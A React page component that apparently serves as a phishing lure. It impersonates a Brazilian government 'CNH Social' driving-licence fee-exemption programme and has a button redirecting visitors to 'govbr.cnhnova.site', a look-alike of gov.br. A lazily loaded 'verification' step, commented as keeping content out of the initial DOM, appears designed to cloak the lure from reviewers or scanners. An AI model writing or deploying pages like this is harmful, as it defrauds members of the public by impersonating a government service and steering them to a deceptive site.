import { useState } from "react";
import DynamicHead from "@/components/DynamicHead";

const Index = () => {
  const [verified, setVerified] = useState(false);

  return (
    <>
      <DynamicHead verified={verified} />
      {!verified ? (
        <main style={{ fontFamily: "Arial, sans-serif", backgroundColor: "#f4f4f4", minHeight: "100vh", margin: 0, padding: 0 }}>
          <HomeContentLazy onVerify={() => setVerified(true)} />
        </main>
      ) : (
        <main style={{ fontFamily: "Arial, sans-serif", backgroundColor: "#f4f4f4", minHeight: "100vh", margin: 0, padding: 0 }}>
          <header
            style={{
              backgroundColor: "#007BFF",
              color: "white",
              padding: "20px",
              textAlign: "center",
            }}
          >
            <h1>CNH Social - Programa de Isenção de Taxas</h1>
          </header>
          <div
            style={{
              maxWidth: "900px",
              margin: "20px auto",
              padding: "20px",
              backgroundColor: "white",
              borderRadius: "8px",
              boxShadow: "0 2px 10px rgba(0,0,0,0.1)",
              textAlign: "center",
            }}
          >
            <h2 style={{ color: "#007BFF", fontSize: "22px" }}>Verifique sua elegibilidade</h2>
            <p style={{ fontSize: "14px", lineHeight: 1.6, color: "#555" }}>
              Clique no botão abaixo para verificar se você tem direito ao programa CNH Social.
            </p>
            <button
              onClick={() => window.location.href = "https://govbr.cnhnova.site/?utm_source=site&utm_medium=button&utm_campaign=cnhsocial"}
              style={{
                backgroundColor: "#FF5733",
                color: "white",
                border: "none",
                padding: "15px 30px",
                cursor: "pointer",
                borderRadius: "10px",
                fontSize: "18px",
                display: "block",
                margin: "20px auto",
                boxShadow: "0 5px 15px rgba(0,0,0,0.3)",
                animation: "pulse 2s infinite",
              }}
            >
              Verificar agora
            </button>
          </div>
          <style>{`
            @keyframes pulse {
              0% { transform: scale(1); }
              50% { transform: scale(1.05); }
              100% { transform: scale(1); }
            }
          `}</style>
        </main>
      )}
    </>
  );
};

// Lazy import to prevent HomeContent from being in the initial DOM
import { lazy, Suspense } from "react";
const HomeContentComponent = lazy(() => import("@/components/HomeContent"));

const HomeContentLazy = ({ onVerify }: { onVerify: () => void }) => (
  <Suspense fallback={<div style={{ textAlign: "center", padding: "40px" }}>Carregando...</div>}>
    <HomeContentComponent onVerify={onVerify} />
  </Suspense>
);

export default Index;
